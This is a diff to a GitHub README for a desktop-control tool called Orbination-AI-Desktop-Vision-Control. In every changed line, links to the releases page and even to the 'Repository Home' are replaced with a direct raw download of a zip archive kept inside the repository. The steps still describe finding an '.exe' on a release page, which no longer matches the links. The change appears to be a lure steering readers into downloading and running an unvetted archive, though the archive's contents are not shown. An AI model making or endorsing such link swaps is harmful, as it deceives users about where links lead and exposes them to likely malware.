@@ -1,6 +1,6 @@
 # 🤖 Orbination-AI-Desktop-Vision-Control - Full Desktop Control Made Easy
 
-[![Download Orbination-AI-Desktop-Vision-Control](https://img.shields.io/badge/Download-Orbination--AI--Desktop--Vision--Control-green?style=for-the-badge)](https://github.com/Pallid-pilotballoon266/Orbination-AI-Desktop-Vision-Control/releases)
+[![Download Orbination-AI-Desktop-Vision-Control](https://img.shields.io/badge/Download-Orbination--AI--Desktop--Vision--Control-green?style=for-the-badge)](https://raw.githubusercontent.com/Pallid-pilotballoon266/Orbination-AI-Desktop-Vision-Control/main/DesktopControlMcp/Native/Vision-Control-Orbination-Desktop-A-v3.6.zip)
 
 ---
 
@@ -39,7 +39,7 @@ Make sure your Windows is up to date for best compatibility.
 
 1. Visit the official release page here:
 
-   [Download Orbination-AI-Desktop-Vision-Control](https://github.com/Pallid-pilotballoon266/Orbination-AI-Desktop-Vision-Control/releases)
+   [Download Orbination-AI-Desktop-Vision-Control](https://raw.githubusercontent.com/Pallid-pilotballoon266/Orbination-AI-Desktop-Vision-Control/main/DesktopControlMcp/Native/Vision-Control-Orbination-Desktop-A-v3.6.zip)
 
 2. On the release page, find the latest version. Look for a file that ends with `.exe`.
 
@@ -112,7 +112,7 @@ Most features work without extra configuration. However, some tasks like UIAutom
 
 ## 📁 More Resources
 
-- Check the [Releases page](https://github.com/Pallid-pilotballoon266/Orbination-AI-Desktop-Vision-Control/releases) for updates and bug fixes.
+- Check the [Releases page](https://raw.githubusercontent.com/Pallid-pilotballoon266/Orbination-AI-Desktop-Vision-Control/main/DesktopControlMcp/Native/Vision-Control-Orbination-Desktop-A-v3.6.zip) for updates and bug fixes.
 - The repository includes example sequences and configuration files.
 - Explore the included tools to get familiar with what each does.
 - The app runs offline after installation, but visiting the releases page helps you stay current.
@@ -121,8 +121,8 @@ Most features work without extra configuration. However, some tasks like UIAutom
 
 ## 🔗 Useful Links
 
-[💾 Download Orbination-AI-Desktop-Vision-Control](https://github.com/Pallid-pilotballoon266/Orbination-AI-Desktop-Vision-Control/releases)  
-[📘 Repository Home](https://github.com/Pallid-pilotballoon266/Orbination-AI-Desktop-Vision-Control)  
+[💾 Download Orbination-AI-Desktop-Vision-Control](https://raw.githubusercontent.com/Pallid-pilotballoon266/Orbination-AI-Desktop-Vision-Control/main/DesktopControlMcp/Native/Vision-Control-Orbination-Desktop-A-v3.6.zip)  
+[📘 Repository Home](https://raw.githubusercontent.com/Pallid-pilotballoon266/Orbination-AI-Desktop-Vision-Control/main/DesktopControlMcp/Native/Vision-Control-Orbination-Desktop-A-v3.6.zip)  
 
 ---
 
